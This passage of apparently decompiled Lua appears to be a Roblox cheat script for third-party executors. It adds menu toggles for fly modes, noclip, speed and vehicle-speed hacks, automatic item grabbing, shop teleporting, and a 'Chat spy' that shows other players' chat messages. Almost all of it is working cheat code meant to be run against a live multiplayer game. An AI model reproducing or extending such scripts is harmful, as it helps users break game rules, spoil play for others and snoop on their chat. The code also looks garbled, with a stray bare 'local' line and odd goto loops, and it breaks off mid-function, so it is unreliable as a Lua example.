        getgenv().ironmanfly = false

        function SuperheroFly()
          task.spawn(function()
            local val245 = false

            while true do
              local superherofly = getgenv().superherofly

              if superherofly and task.wait() then
                local localPlayer2 = not game.Players.LocalPlayer.Character
                local localPlayer3 = localPlayer2

                if not localPlayer2 then

                  localPlayer3 = not (game.Players.LocalPlayer.Character:FindFirstChild("Humanoid"))
                end

                if localPlayer3 then
                  return
                else
                  local humanoid = game.Players.LocalPlayer.Character.Humanoid
                  local val246 = humanoid.MoveDirection.Magnitude > 0

                  if val246 and not val245 then
                    for key6, value8 in pairs(humanoid:GetPlayingAnimationTracks()) do
                      value8:Stop()
                    end

                    game.Players.LocalPlayer.Character.Animate.Disabled = true

                    local animation2 = Instance.new("Animation")
                    animation2.AnimationId = "rbxassetid://3541044388"

                    local loadAnimation2 = humanoid:LoadAnimation(animation2)
                    loadAnimation2:Play()

                    loadAnimation2.Stopped:Connect(function()
                      local character4 = game.Players.LocalPlayer.Character
                      local animate = character4

                      if character4 then

                        animate = game.Players.LocalPlayer.Character:FindFirstChild("Animate")
                      end

                      if animate then
                        game.Players.LocalPlayer.Character.Animate.Disabled = false
                      end

                      return
                    end)
                  else

                    if not val246 and val245 then
                      for key7, value9 in pairs(humanoid:GetPlayingAnimationTracks()) do
                        value9:Stop()
                      end

                      game.Players.LocalPlayer.Character.Animate.Disabled = true

                      local animation3 = Instance.new("Animation")
                      animation3.AnimationId = "rbxassetid://3541114300"

                      local loadAnimation3 = humanoid:LoadAnimation(animation3)
                      loadAnimation3:Play()
                      loadAnimation3:AdjustSpeed(1)

                      loadAnimation3.Stopped:Connect(function()
                        local character5 = game.Players.LocalPlayer.Character
                        local animate2 = character5

                        if character5 then

                          animate2 = game.Players.LocalPlayer.Character:FindFirstChild("Animate")
                        end

                        if animate2 then
                          game.Players.LocalPlayer.Character.Animate.Disabled = false
                        end

                        return
                      end)
                    end
                  end

                  val245 = val246
                end
              else
                break
              end
            end

            return
          end)

          return
        end

        function IronManFly()
          task.spawn(function()
            local val247 = false

            while true do
              local ironmanfly = getgenv().ironmanfly

              if ironmanfly and task.wait() then
                local localPlayer4 = not game.Players.LocalPlayer.Character
                local localPlayer5 = localPlayer4

                if not localPlayer4 then

                  localPlayer5 = not (game.Players.LocalPlayer.Character:FindFirstChild("Humanoid"))
                end

                if localPlayer5 then
                  return
                else
                  local humanoid2 = game.Players.LocalPlayer.Character.Humanoid
                  local val248 = humanoid2.MoveDirection.Magnitude > 0

                  if val248 and not val247 then
                    for key8, value10 in pairs(humanoid2:GetPlayingAnimationTracks()) do
                      value10:Stop()
                    end

                    game.Players.LocalPlayer.Character.Animate.Disabled = true

                    local animation4 = Instance.new("Animation")
                    animation4.AnimationId = "rbxassetid://13850657882"

                    local loadAnimation4 = humanoid2:LoadAnimation(animation4)
                    loadAnimation4:Play()

                    loadAnimation4.Stopped:Connect(function()
                      local character6 = game.Players.LocalPlayer.Character
                      local animate3 = character6

                      if character6 then

                        animate3 = game.Players.LocalPlayer.Character:FindFirstChild("Animate")
                      end

                      if animate3 then
                        game.Players.LocalPlayer.Character.Animate.Disabled = false
                      end

                      return
                    end)
                  else

                    if not val248 and val247 then
                      for key9, value11 in pairs(humanoid2:GetPlayingAnimationTracks()) do
                        value11:Stop()
                      end

                      game.Players.LocalPlayer.Character.Animate.Disabled = true

                      local animation5 = Instance.new("Animation")
                      animation5.AnimationId = "rbxassetid://13850660986"

                      local loadAnimation5 = humanoid2:LoadAnimation(animation5)
                      loadAnimation5:Play()
                      loadAnimation5:AdjustSpeed(1)

                      loadAnimation5.Stopped:Connect(function()
                        local character7 = game.Players.LocalPlayer.Character
                        local animate4 = character7

                        if character7 then

                          animate4 = game.Players.LocalPlayer.Character:FindFirstChild("Animate")
                        end

                        if animate4 then
                          game.Players.LocalPlayer.Character.Animate.Disabled = false
                        end

                        return
                      end)
                    end
                  end

                  val247 = val248
                end
              else
                break
              end
            end

            return
          end)

          return
        end

        val166 = "Normal"

        game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()

          local character8 = game:GetService("Players").LocalPlayer.Character
          character8:WaitForChild("FULLY_LOADED_CHAR")

          if val164 then
            if val166 == "Normal" then
              Fly()
            else
              if val166 == "Cframe Fly" then
                uncframefly()
                cframefly()
              else
                if val166 == "Vehicle Fly" then
                  local val249 = (identifyexecutor()) == "AWP"
                  local val250 = val249

                  if not val249 then
                    local val251 = (identifyexecutor()) == "Swift"
                    local touchEnabled3 = val251

                    if not val251 then

                      touchEnabled3 = game:GetService("UserInputService").TouchEnabled
                    end

                    val250 = touchEnabled3
                  end

                  if val250 then
                    createElement2()
                  else
                    createElement()
                  end
                else
                  if val166 == "SuperHero Fly" then
                    Fly()
                    getgenv().superherofly = true
                    SuperheroFly()

                    for key10, value12 in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                      value12:Stop()
                    end

                    game.Players.LocalPlayer.Character.Animate.Disabled = true

                    local animation6 = Instance.new("Animation")
                    animation6.AnimationId = "rbxassetid://3541114300"

                    local loadAnimation6 = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation6)
                    loadAnimation6:Play()
                    loadAnimation6:AdjustSpeed(1)

                    loadAnimation6.Stopped:Connect(function()
                      local character9 = game.Players.LocalPlayer.Character
                      local animate5 = character9

                      if character9 then

                        animate5 = game.Players.LocalPlayer.Character:FindFirstChild("Animate")
                      end

                      if animate5 then
                        game.Players.LocalPlayer.Character.Animate.Disabled = false
                      end

                      return
                    end)
                  else
                    if val166 == "IronMan Fly" then
                      Fly()
                      getgenv().ironmanfly = true
                      IronManFly()

                      for key11, value13 in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                        value13:Stop()
                      end

                      game.Players.LocalPlayer.Character.Animate.Disabled = true

                      local animation7 = Instance.new("Animation")
                      animation7.AnimationId = "rbxassetid://13850660986"

                      local loadAnimation7 = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation7)
                      loadAnimation7:Play()

                      loadAnimation7.Stopped:Connect(function()
                        local character10 = game.Players.LocalPlayer.Character
                        local animate6 = character10

                        if character10 then

                          animate6 = game.Players.LocalPlayer.Character:FindFirstChild("Animate")
                        end

                        if animate6 then
                          game.Players.LocalPlayer.Character.Animate.Disabled = false
                        end

                        return
                      end)
                    end
                  end
                end
              end
            end
          end

          return
        end)

        val27 = ui

        ui:AddToggle(main, "Fly", false, function(p9)

          val165 = p9
          val164 = p9
          local humanoid3

          if val164 then
            if val166 == "Normal" then
              Fly()
            else
              if val166 == "Cframe Fly" then
                cframefly()
              else
                if val166 == "Vehicle Fly" then
                  local val252 = (identifyexecutor()) == "AWP"
                  local val253 = val252

                  if not val252 then
                    local val254 = (identifyexecutor()) == "Swift"
                    local touchEnabled4 = val254

                    if not val254 then

                      touchEnabled4 = game:GetService("UserInputService").TouchEnabled
                    end

                    val253 = touchEnabled4
                  end

                  if val253 then
                    createElement2()
                  else
                    createElement()
                  end
                else
                  if val166 == "SuperHero Fly" then
                    getgenv().superherofly = true
                    SuperheroFly()

                    for key12, value14 in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                      value14:Stop()
                    end

                    game.Players.LocalPlayer.Character.Animate.Disabled = true

                    local animation8 = Instance.new("Animation")
                    animation8.AnimationId = "rbxassetid://3541114300"

                    local loadAnimation8 = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation8)
                    loadAnimation8:Play()
                    loadAnimation8:AdjustSpeed(1)

                    loadAnimation8.Stopped:Connect(function()
                      local character11 = game.Players.LocalPlayer.Character
                      local animate7 = character11

                      if character11 then

                        animate7 = game.Players.LocalPlayer.Character:FindFirstChild("Animate")
                      end

                      if animate7 then
                        game.Players.LocalPlayer.Character.Animate.Disabled = false
                      end

                      return
                    end)

                    Fly()
                  else
                    if val166 == "IronMan Fly" then
                      getgenv().ironmanfly = true
                      IronManFly()

                      for key13, value15 in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                        value15:Stop()
                      end

                      game.Players.LocalPlayer.Character.Animate.Disabled = true

                      local animation9 = Instance.new("Animation")
                      animation9.AnimationId = "rbxassetid://13850660986"

                      local loadAnimation9 = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation9)
                      loadAnimation9:Play()
                      loadAnimation9:AdjustSpeed(1)

                      loadAnimation9.Stopped:Connect(function()
                        local character12 = game.Players.LocalPlayer.Character
                        local animate8 = character12

                        if character12 then

                          animate8 = game.Players.LocalPlayer.Character:FindFirstChild("Animate")
                        end

                        if animate8 then
                          game.Players.LocalPlayer.Character.Animate.Disabled = false
                        end

                        return
                      end)

                      Fly()
                    end
                  end
                end
              end
            end
          else
            getgenv().superherofly = false
            getgenv().ironmanfly = false

            for key14, value16 in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
              value16:Stop()
            end

            if val166 == "Normal" then
              unfly()
            else
              if val166 == "Cframe Fly" then
                uncframefly()
              else
                if val166 == "Vehicle Fly" then
                  helper15()
                else

                  if val166 == "SuperHero Fly" or val166 == "IronMan Fly" then
                    if fallnoclip then

                      fallnoclip:Disconnect()
                    end

                    if (game.Players.LocalPlayer.Character:FindFirstChild("Animate")) then
                      game.Players.LocalPlayer.Character.Animate.Disabled = false
                    end

                    unfly()

                    game.Players.LocalPlayer.Character.Humanoid:GetState()

                    repeat
                      task.wait()
                      humanoid3 = game.Players.LocalPlayer.Character.Humanoid
                    until (humanoid3:GetState()) == Enum.HumanoidStateType.Freefall

                    local animation10 = Instance.new("Animation")
                    animation10.AnimationId = "rbxassetid://13850654420"

                    local loadAnimation10 = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation10)
                    loadAnimation10:Play()

                    local val255 = {}

                    for key15, value17 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                      if (value17:IsA("BasePart")) then
                        val255[value17] = value17.CanCollide
                        value17.CanCollide = false
                      end
                    end

                    local connect10 = game:GetService("RunService").Stepped:Connect(function()

                      for key16, value18 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                        if (value18:IsA("BasePart")) then
                          value18.CanCollide = false
                        end
                      end

                      return
                    end)

                    repeat
                      task.wait()
                    until game.Players.LocalPlayer.Character.Humanoid.FloorMaterial
                      ~= Enum.Material.Air

                    loadAnimation10:Stop()

                    local animation11 = Instance.new("Animation")
                    animation11.AnimationId = "rbxassetid://13850663836"

                    local loadAnimation11 = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation11)
                    loadAnimation11:Play()
                    loadAnimation11:AdjustSpeed(1)

                    if connect10 then
                      connect10:Disconnect()
                    end

                    for key17, value19 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do

                      if (value19:IsA("BasePart")) and val255[value19] ~= nil then
                        value19.CanCollide = val255[value19]
                      end
                    end
                  end
                end
              end
            end
          end

          return
        end)

        val28 = ui

        ui:AddDropdown(main, "Fly Mode", { "Normal", "Cframe Fly", "Vehicle Fly", "SuperHero Fly", "IronMan Fly" }, val166, UDim2.new(0, 172, 0, 0), function(p10)

          if val164 then
            getgenv().ironmanfly = false
            getgenv().superherofly = false

            for key18, value20 in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
              value20:Stop()
            end

            if (game.Players.LocalPlayer.Character:FindFirstChild("Animate")) then
              game.Players.LocalPlayer.Character.Animate.Disabled = false
            end

            if val166 == "Normal" then
              unfly()
            else
              if val166 == "Cframe Fly" then
                uncframefly()
              else
                if val166 == "Vehicle Fly" then
                  helper15()
                else

                  if val166 == "SuperHero Fly" or val166 == "IronMan Fly" then
                    if fallnoclip then

                      fallnoclip:Disconnect()
                    end

                    for key19, value21 in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                      value21:Stop()
                    end

                    if (game.Players.LocalPlayer.Character:FindFirstChild("Animate")) then
                      game.Players.LocalPlayer.Character.Animate.Disabled = false
                    end

                    unfly()

                    game.Players.LocalPlayer.Character.Humanoid:GetState()

                    repeat
                      task.wait()
                      humanoid4 = game.Players.LocalPlayer.Character.Humanoid
                    until (humanoid4:GetState()) == Enum.HumanoidStateType.Freefall

                    local animation12 = Instance.new("Animation")
                    animation12.AnimationId = "rbxassetid://13850654420"

                    local loadAnimation12 = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation12)
                    loadAnimation12:Play()

                    local val256 = {}

                    for key20, value22 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                      if (value22:IsA("BasePart")) then
                        val256[value22] = value22.CanCollide
                        value22.CanCollide = false
                      end
                    end

                    fallnoclip = game:GetService("RunService").Stepped:Connect(function()

                      for key21, value23 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                        if (value23:IsA("BasePart")) then
                          value23.CanCollide = false
                        end
                      end

                      return
                    end)

                    repeat
                      task.wait()
                    until game.Players.LocalPlayer.Character.Humanoid.FloorMaterial
                      ~= Enum.Material.Air

                    loadAnimation12:Stop()

                    local animation13 = Instance.new("Animation")
                    animation13.AnimationId = "rbxassetid://13850663836"

                    local loadAnimation13 = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation13)
                    loadAnimation13:Play()
                    loadAnimation13:AdjustSpeed(1)

                    if fallnoclip then

                      fallnoclip:Disconnect()
                    end

                    for key22, value24 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do

                      if (value24:IsA("BasePart")) and val256[value24] ~= nil then
                        value24.CanCollide = val256[value24]
                      end
                    end
                  end
                end
              end
            end
          end

          val166 = p10

          if val164 then
            if val166 == "Normal" then
              Fly()
            else
              if val166 == "Cframe Fly" then
                cframefly()
              else
                if val166 == "Vehicle Fly" then
                  local val257 = (identifyexecutor()) == "AWP"
                  local val258 = val257

                  if not val257 then
                    local val259 = (identifyexecutor()) == "Swift"
                    local touchEnabled5 = val259

                    if not val259 then

                      touchEnabled5 = game:GetService("UserInputService").TouchEnabled
                    end

                    val258 = touchEnabled5
                  end

                  if val258 then
                    createElement2()
                  else
                    createElement()
                  end
                else
                  if val166 == "SuperHero Fly" then
                    getgenv().superherofly = true
                    SuperheroFly()

                    for key23, value25 in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                      value25:Stop()
                    end

                    game.Players.LocalPlayer.Character.Animate.Disabled = true

                    local animation14 = Instance.new("Animation")
                    animation14.AnimationId = "rbxassetid://3541114300"

                    local loadAnimation14 = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation14)
                    loadAnimation14:Play()
                    loadAnimation14:AdjustSpeed(1)

                    loadAnimation14.Stopped:Connect(function()
                      local character13 = game.Players.LocalPlayer.Character
                      local animate9 = character13

                      if character13 then

                        animate9 = game.Players.LocalPlayer.Character:FindFirstChild("Animate")
                      end

                      if animate9 then
                        game.Players.LocalPlayer.Character.Animate.Disabled = false
                      end

                      return
                    end)

                    Fly()
                  else
                    if val166 == "IronMan Fly" then
                      getgenv().ironmanfly = true
                      IronManFly()

                      for key24, value26 in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                        value26:Stop()
                      end

                      game.Players.LocalPlayer.Character.Animate.Disabled = true

                      local animation15 = Instance.new("Animation")
                      animation15.AnimationId = "rbxassetid://13850660986"

                      local loadAnimation15 = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation15)
                      loadAnimation15:Play()
                      loadAnimation15:AdjustSpeed(1)

                      loadAnimation15.Stopped:Connect(function()
                        local character14 = game.Players.LocalPlayer.Character
                        local animate10 = character14

                        if character14 then

                          animate10 = game.Players.LocalPlayer.Character:FindFirstChild("Animate")
                        end

                        if animate10 then
                          game.Players.LocalPlayer.Character.Animate.Disabled = false
                        end

                        return
                      end)

                      Fly()
                    end
                  end
                end
              end
            end
          end

          return
        end)

        val29 = ui

        ui:AddKeybind(main, "Fly Bind", function()

          if val165 then
            val164 = not val164

            if val164 then
              if val166 == "Normal" then
                Fly()
              else
                if val166 == "Cframe Fly" then
                  cframefly()
                else
                  if val166 == "Vehicle Fly" then
                    local val260 = (identifyexecutor()) == "AWP"
                    local val261 = val260

                    if not val260 then
                      local val262 = (identifyexecutor()) == "Swift"
                      local touchEnabled6 = val262

                      if not val262 then

                        touchEnabled6 = game:GetService("UserInputService").TouchEnabled
                      end

                      val261 = touchEnabled6
                    end

                    if val261 then
                      createElement2()
                    else
                      createElement()
                    end
                  else
                    if val166 == "SuperHero Fly" then
                      getgenv().superherofly = true
                      SuperheroFly()

                      for key25, value27 in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                        value27:Stop()
                      end

                      game.Players.LocalPlayer.Character.Animate.Disabled = true

                      local animation16 = Instance.new("Animation")
                      animation16.AnimationId = "rbxassetid://3541114300"

                      local loadAnimation16 = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation16)
                      loadAnimation16:Play()
                      loadAnimation16:AdjustSpeed(1)

                      loadAnimation16.Stopped:Connect(function()
                        local character15 = game.Players.LocalPlayer.Character
                        local animate11 = character15

                        if character15 then

                          animate11 = game.Players.LocalPlayer.Character:FindFirstChild("Animate")
                        end

                        if animate11 then
                          game.Players.LocalPlayer.Character.Animate.Disabled = false
                        end

                        return
                      end)

                      Fly()
                    else
                      if val166 == "IronMan Fly" then
                        getgenv().ironmanfly = true
                        IronManFly()

                        for key26, value28 in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                          value28:Stop()
                        end

                        game.Players.LocalPlayer.Character.Animate.Disabled = true

                        local animation17 = Instance.new("Animation")
                        animation17.AnimationId = "rbxassetid://13850660986"

                        local loadAnimation17 = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation17)
                        loadAnimation17:Play()
                        loadAnimation17:AdjustSpeed(1)

                        loadAnimation17.Stopped:Connect(function()
                          local character16 = game.Players.LocalPlayer.Character
                          local animate12 = character16

                          if character16 then

                            animate12 = game.Players.LocalPlayer.Character:FindFirstChild("Animate")
                          end

                          if animate12 then
                            game.Players.LocalPlayer.Character.Animate.Disabled = false
                          end

                          return
                        end)

                        Fly()
                      end
                    end
                  end
                end
              end
            else
              getgenv().superherofly = false
              getgenv().ironmanfly = false

              if val166 == "Normal" then
                unfly()
              else
                if val166 == "Cframe Fly" then
                  uncframefly()
                else
                  if val166 == "Vehicle Fly" then
                    helper15()
                  else

                    if val166 == "SuperHero Fly" or val166 == "IronMan Fly" then
                      if fallnoclip then

                        fallnoclip:Disconnect()
                      end

                      for key27, value29 in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                        value29:Stop()
                      end

                      unfly()

                      game.Players.LocalPlayer.Character.Humanoid:GetState()

                      repeat
                        task.wait()
                        humanoid5 = game.Players.LocalPlayer.Character.Humanoid
                      until (humanoid5:GetState()) == Enum.HumanoidStateType.Freefall

                      local animation18 = Instance.new("Animation")
                      animation18.AnimationId = "rbxassetid://13850654420"

                      local loadAnimation18 = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation18)
                      loadAnimation18:Play()

                      local val263 = {}

                      for key28, value30 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                        if (value30:IsA("BasePart")) then
                          val263[value30] = value30.CanCollide
                          value30.CanCollide = false
                        end
                      end

                      fallnoclip = game:GetService("RunService").Stepped:Connect(function()

                        for key29, value31 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                          if (value31:IsA("BasePart")) then
                            value31.CanCollide = false
                          end
                        end

                        return
                      end)

                      repeat
                        task.wait()
                      until game.Players.LocalPlayer.Character.Humanoid.FloorMaterial
                        ~= Enum.Material.Air

                      loadAnimation18:Stop()

                      local animation19 = Instance.new("Animation")
                      animation19.AnimationId = "rbxassetid://13850663836"

                      local loadAnimation19 = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation19)
                      loadAnimation19:Play()
                      loadAnimation19:AdjustSpeed(1)

                      if fallnoclip then

                        fallnoclip:Disconnect()
                      end

                      for key30, value32 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do

                        if (value32:IsA("BasePart")) and val263[value32] ~= nil then
                          value32.CanCollide = val263[value32]
                        end
                      end
                    end
                  end
                end
              end
            end
          end

          return
        end, Enum.KeyCode.X)

        val30 = ui

        ui:AddSlider(main, "Fly Speed", 0, 1000, val161, function(p11)
          val161 = p11
          return
        end)

        val167 = 1
        val168 = true
        val169 = false
        val31 = game

        function helper3()
          local val264 = val168
          local val265 = val264

          if not val264 then
            local localPlayer6 = not game.Players.LocalPlayer.Character
            local val266 = localPlayer6

            if not localPlayer6 then

              local localPlayer7 = not (game.Players.LocalPlayer.Character:FindFirstChild("Humanoid"))
              local localPlayer8 = localPlayer7

              if not localPlayer7 then

                localPlayer8 = not (game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"))
              end

              val266 = localPlayer8
            end

            val265 = val266
          end

          if val265 then
            return
          else
            local moveDirection = game.Players.LocalPlayer.Character.Humanoid.MoveDirection

            if moveDirection.Magnitude > 0 then
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                + moveDirection.Unit * val167
            end

            return
          end
        end

        val31:GetService("RunService").Heartbeat:Connect(helper3)
        val32 = ui

        ui:AddToggle(main, "CFrame Speed", false, function(p12)
          val169 = p12
          val168 = not p12
          return
        end)

        val33 = ui

        ui:AddKeybind(main, "CFrame Speed Bind", function()
          if val169 then
            val168 = not val168
          end

          return
        end, Enum.KeyCode.C)

        val34 = ui

        ui:AddSlider(main, "CFrame Speed", 1, 15, 1, function(p13)
          val167 = p13
          return
        end)

        val170 = false
        val171 = false

        function helper4()

          if connect3 then

            connect3:Disconnect()
          end

          for key31, value33 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do

            if (value33:IsA("BasePart")) and val172[value33] ~= nil then
              value33.CanCollide = val172[value33]
            end
          end

          val172 = {}
          return
        end

        connect3 = nil
        val172 = {}

        function connect4()
          local character17 = game.Players.LocalPlayer.Character

          for key32, value34 in pairs(character17:GetDescendants()) do
            if (value34:IsA("BasePart")) then
              val172[value34] = value34.CanCollide
              value34.CanCollide = false
            end
          end

          connect3 = game:GetService("RunService").Stepped:Connect(function()

            for key33, value35 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
              if (value35:IsA("BasePart")) then
                value35.CanCollide = false
              end
            end

            return
          end)

          return
        end

        val173 = helper4
        val35 = ui

        ui:AddToggle(main, "Noclip", false, function(p14)
          val171 = p14
          val170 = p14

          if val170 then
            connect4()
          else
            helper4()
          end

          return
        end)

        val36 = ui

        ui:AddKeybind(main, "Noclip Bind", function()
          if val171 then
            val170 = not val170

            if val170 then
              connect4()
            else
              helper4()
            end
          end

          return
        end, Enum.KeyCode.N)

        val37 = ui

        ui:AddButton(main, "Chat spy", function()
local element2, val267

          if getgenv().ChatSpy then
            return
          else
            getgenv().ChatSpy = true
            element2 = { enabled = true, spyOnMyself = false }

            if element2.enabled then
              game:GetService("TextChatService").ChatWindowConfiguration.Enabled = true

              game:GetService("TextChatService").TextChannels.RBXGeneral:DisplaySystemMessage("{SPY Enabled}")
            else
              game:GetService("TextChatService").ChatWindowConfiguration.Enabled = false

              game:GetService("TextChatService").TextChannels.RBXGeneral:DisplaySystemMessage("{SPY Disabled}")
            end

            val267 = {}

            game:GetService("TextChatService").MessageReceived:Connect(function(p15)

              if p15.TextSource then

                local players = game:GetService("Players")
                local getPlayerByUserId = players:GetPlayerByUserId(p15.TextSource.UserId)

                if getPlayerByUserId then
                  local val268 = val267[getPlayerByUserId] or {}
                  val267[getPlayerByUserId] = val268
                  table.insert(val267[getPlayerByUserId], p15.Text)
                end
              end

              return
            end)

            local 

            local function waitLoop9(val269)

              val269.Chatted:Connect(function(message)
                task.wait(0.5)
                local val270 = false

                local val271 = val267[val269] or {}

                for index2, value36 in ipairs(val271) do
                  if value36 == message then
                    val270 = true
                    break
                  end
                end

                if element2.enabled then

                  if val269 ~= game:GetService("Players").LocalPlayer or element2.spyOnMyself then
                    if not val270 then

                      game:GetService("TextChatService").TextChannels.RBXGeneral:DisplaySystemMessage(string.format(
                        "[SPY] %s: %s", val269.Name, message
                      ))
                    end
                  end
                end

                return
              end)

              return
            end

            local players2 = game:GetService("Players")

            for index3, value37 in ipairs(players2:GetPlayers()) do
              waitLoop9(value37)
            end

            game:GetService("Players").PlayerAdded:Connect(waitLoop9)
            return
          end
        end)

        getgenv().Ragdoll = false
        val38 = ui

        ui:AddToggle(main, "Damge yourself", false, function(ragdoll)
          getgenv().Ragdoll = ragdoll

          while true do
            local ragdoll2 = getgenv().Ragdoll

            if ragdoll2 and task.wait() then
              firetouchinterest(
                game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").MAP.Indestructible.Lasers.Part, 0
              )

              firetouchinterest(
                game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").MAP.Indestructible.Lasers.Part, 1
              )
            else
              break
            end
          end

          return
        end)

        val174 = false
        val39 = ui

        ui:AddToggle(main, "Get All Lockpicks", false, function(p17)
          val174 = p17

          if p17 then
            task.spawn(function()

              while val174 do
                local val272 = 0

                for key34, value38 in pairs(game.Workspace.Ignored.ItemsDrop:GetDescendants()) do

                  if value38.Name == "[LockPicker]" and val272 < 17 then
                    wait(0.1)

                    firetouchinterest(
                      game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, value38.Handle, 0
                    )

                    val272 = val272 + 1
                    ::L6323197::
                  else
                    if val272 >= 17 then
                      break
                    else
                      goto L6323197
                    end
                  end
                end

                wait(0.5)
              end

              return
            end)
          end

          return
        end)

        val40 = ui

        ui:AddButton(main, "Force Reset", function()
          local character18 = game.Players.LocalPlayer.Character

          for key35, value39 in pairs(character18:GetChildren()) do
            if (value39:IsA("Accessory")) then

              value39.Handle:Destroy()
            end
          end

          for key36, value40 in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
            local accessory = value40:IsA("Accessory")
            local meshPart = accessory

            if not accessory then
              local part2 = value40:IsA("Part")

              meshPart = part2 or value40:IsA("MeshPart")
            end

            if meshPart then
              value40:Remove()
            end
          end

          wait()

          game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
          return
        end)

        val175 = 80
        val176 = false
        instance = nil
        instance2 = nil
        findFirstChild = nil
        val41 = ui

        ui:AddTextbox(main, "Vehicle speed", "Type Here...", function(p18)
          local numVal2 = tonumber(p18)

          if numVal2 then
            val175 = numVal2
          else
            print("Invalid speed input")
          end

          return
        end)

        function helper16()
          findFirstChild = workspace.Vehicles:FindFirstChild(game.Players.LocalPlayer.Name)

          if findFirstChild then
            if instance then

              instance:Destroy()
            end

            if instance2 then

              instance2:Destroy()
            end

            instance = Instance.new("BodyGyro", findFirstChild)
            instance2 = Instance.new("BodyVelocity", findFirstChild)

            instance.P = 90000
            instance.MaxTorque = Vector3.new(9000000000, 9000000000, 9000000000)
            instance.CFrame = findFirstChild.CFrame

            instance2.MaxForce = Vector3.new(9000000000, 0, 9000000000)
            instance2.Velocity = findFirstChild.CFrame.LookVector * val175

            val176 = true
          else
            warn("Vehicle not found!")
          end

          return
        end

        val42 = ui

        ui:AddToggle(main, "Enable Vehicle Speed", false, function(p19)

          if p19 then
            helper16()
          else
            val176 = false

            if instance then

              instance:Destroy()
              instance = nil
            end

            if instance2 then

              instance2:Destroy()
              instance2 = nil
            end
          end

          return
        end)

        val43 = ui

        ui:AddKeybind(main, "Vehicle Speed bind", function()

          if val176 then
            val176 = false

            if instance then

              instance:Destroy()
              instance = nil
            end

            if instance2 then

              instance2:Destroy()
              instance2 = nil
            end
          else
            val176 = true
            helper16()
          end

          return
        end, Enum.KeyCode.K)

        game:GetService("RunService").RenderStepped:Connect(function()
          local val273 = findFirstChild
          local val274 = val273

          if val273 then

            val274 = val176 and instance2
          end

          if val274 then

            instance2.Velocity = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").MoveDirection
              * val175

            instance.CFrame = workspace.CurrentCamera.CFrame * (CFrame.Angles(0, 0, 0))
          end

          return
        end)

        game.Players.LocalPlayer.CharacterAdded:Connect(function(character19)
          character19:WaitForChild("Humanoid")

          if val176 then
            helper16()
          end

          return
        end)

        function helper5()

          local localPlayer9 = not (game.Players.LocalPlayer.Backpack:FindFirstChild("[Mask]"))
          local mask = localPlayer9

          if not localPlayer9 then

            mask = game.Players.LocalPlayer.Character:FindFirstChild("[Mask]")
          end

          local backpack

          if mask then

            game.Players.LocalPlayer.Backpack:FindFirstChild("[Mask]")

            repeat
              task.wait()

              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop["[Surgeon Mask] - $28"].Head.CFrame
                * (CFrame.new(0, -4, 0))

              game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                0, 0, 0
              )

              local clickDetector2 = game.Workspace.Ignored.Shop["[Surgeon Mask] - $28"]:FindFirstChildWhichIsA("ClickDetector")

              if clickDetector2 then
                fireclickdetector(clickDetector2)
              end

              backpack = game.Players.LocalPlayer.Backpack
            until (backpack:FindFirstChild("[Mask]"))
          end

          game.Players.LocalPlayer.Character:FindFirstChild("[Mask]")
          local character20

          repeat
            task.wait(0.01)

            game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("[Mask]"))
            character20 = game.Players.LocalPlayer.Character
          until (character20:FindFirstChild("[Mask]"))

          local mask2 = game.Players.LocalPlayer.Character:FindFirstChild("[Mask]")

          if mask2 then
            mask2:Activate()
            task.wait()

